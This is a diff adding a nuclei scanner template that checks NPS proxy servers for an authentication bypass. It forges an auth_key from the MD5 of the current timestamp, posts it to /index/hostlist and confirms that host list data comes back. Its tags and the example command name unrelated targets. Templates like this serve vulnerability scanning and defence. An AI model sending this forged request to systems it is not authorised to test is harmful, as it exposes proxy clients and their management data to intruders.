@@ -1,0 +1,45 @@
+id: check_NPS-AUTH-BYPASS
+info:
+  name: check_NPS-AUTH-BYPASS
+  author: 51pwn
+  severity: critical
+  description: |+
+    https://saucer-man.com/information_security/748.html
+  reference:
+    - https://github.com/hktalent/nuclei-templates
+    - https://51pwn.com
+  tags: web,go,microsoft,exchange,outlook
+
+# nuclei -duc -u http://localhost:9999 -t ./51pwn/checkGoDebug.yaml
+variables:
+  TimeNow: '{{unix_time(10)}}'
+
+requests:
+  - raw:
+      - |+
+        POST /index/hostlist HTTP/1.1
+        Host: {{Host}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/x-www-form-urlencoded
+
+        auth_key={{md5(TimeNow)}}&timestamp={{TimeNow}}&offset=0&limit=10&search=
+        
+      # end payload
+    unsafe: true
+
+    req-condition: true
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"rows":'
+          - 'total":'
+        condition: and
